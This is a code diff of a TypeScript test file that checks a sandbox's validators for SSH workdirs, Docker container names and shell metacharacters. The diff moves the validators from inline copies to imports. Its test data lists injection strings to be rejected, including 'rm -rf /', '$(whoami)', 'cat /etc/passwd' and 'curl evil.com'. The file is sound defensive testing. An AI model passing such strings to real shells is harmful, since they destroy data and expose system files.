@@ -12,13 +12,15 @@ import * as os from 'node:os';
 import * as path from 'node:path';
 import { ExecPolicyEngine } from '../src/sandbox/execPolicy';
 import { SandboxManager } from '../src/sandbox/manager';
+import { isValidShellPath } from '../src/sandbox/backends/sshBackend';
+import { isValidContainerName } from '../src/sandbox/backends/dockerExecBackend';
+import { SHELL_UNSAFE_RE } from '../src/sandbox/backends/localBackend';
 
 // ============================================================================
 // Test 1: SSH workdir command injection prevention
 // ============================================================================
 describe('SSH workdir command injection', () => {
   it('rejects workdir with shell metacharacters', () => {
-    // These workdir values would allow command injection in the old code
     const maliciousWorkdirs = [
       '/tmp"; rm -rf / #',
       '/tmp$(whoami)',
@@ -28,21 +30,12 @@ describe('SSH workdir command injection', () => {
       '/tmp && curl evil.com',
     ];
 
-    // The validation regex should reject all of these
-    const isValidShellPath = (p: string): boolean => {
-      return /^[a-zA-Z0-9/_. ~@:-]+$/.test(p) && !p.includes('..');
-    };
-
     for (const wd of maliciousWorkdirs) {
       assert.strictEqual(isValidShellPath(wd), false, `Should reject: ${wd}`);
     }
   });
 
   it('allows valid workdir paths', () => {
-    const isValidShellPath = (p: string): boolean => {
-      return /^[a-zA-Z0-9/_. ~@:-]+$/.test(p) && !p.includes('..');
-    };
-
     const validPaths = ['/home/user/project', '/tmp/workspace', '/opt/app/src', os.homedir()];
 
     for (const wd of validPaths) {
@@ -51,10 +44,6 @@ describe('SSH workdir command injection', () => {
   });
 
   it('rejects path traversal in workdir', () => {
-    const isValidShellPath = (p: string): boolean => {
-      return /^[a-zA-Z0-9/_. ~@:-]+$/.test(p) && !p.includes('..');
-    };
-
     assert.strictEqual(isValidShellPath('/tmp/../../../etc/passwd'), false);
     assert.strictEqual(isValidShellPath('/home/user/../../root'), false);
   });
@@ -65,10 +54,6 @@ describe('SSH workdir command injection', () => {
 // ============================================================================
 describe('Docker container name validation', () => {
   it('rejects container names with shell metacharacters', () => {
-    const isValidContainerName = (name: string): boolean => {
-      return /^[a-zA-Z0-9][a-zA-Z0-9_.:/-]{0,127}$/.test(name);
-    };
-
     const maliciousNames = [
       'container; rm -rf /',
       'container$(whoami)',
@@ -85,10 +70,6 @@ describe('Docker container name validation', () => {
   });
 
   it('allows valid container names and IDs', () => {
-    const isValidContainerName = (name: string): boolean => {
-      return /^[a-zA-Z0-9][a-zA-Z0-9_.:/-]{0,127}$/.test(name);
-    };
-
     const validNames = [
       'my-container',
       'my_container',
@@ -109,8 +90,6 @@ describe('Docker container name validation', () => {
 // ============================================================================
 describe('Shell metacharacter detection', () => {
   it('detects all dangerous shell metacharacters', () => {
-    const SHELL_UNSAFE_RE = /[;&|`$(){}[\]!#~<>*\n\t'"\\\x00-\x1f\x7f-\x9f]/;
-
     const dangerous = [
       'echo; rm -rf /',
       'echo | cat /etc/passwd',
@@ -133,13 +112,10 @@ describe('Shell metacharacter detection', () => {
   });
 
   it('allows safe commands', () => {
-    const SHELL_UNSAFE_RE = /[;&|`$(){}[\]!#~<>*\n\t'"\\\x00-\x1f\x7f-\x9f]/;
-
     const safe = ['ls -la', 'cat file.txt', 'npm install', 'git status', 'node script.js'];
 
     for (const cmd of safe) {
-      // These should not trigger (though some might due to spaces, which is fine)
-      // The key is they don't contain the truly dangerous chars
+      assert.strictEqual(SHELL_UNSAFE_RE.test(cmd), false, `Should allow: ${cmd}`);
     }
   });
 });
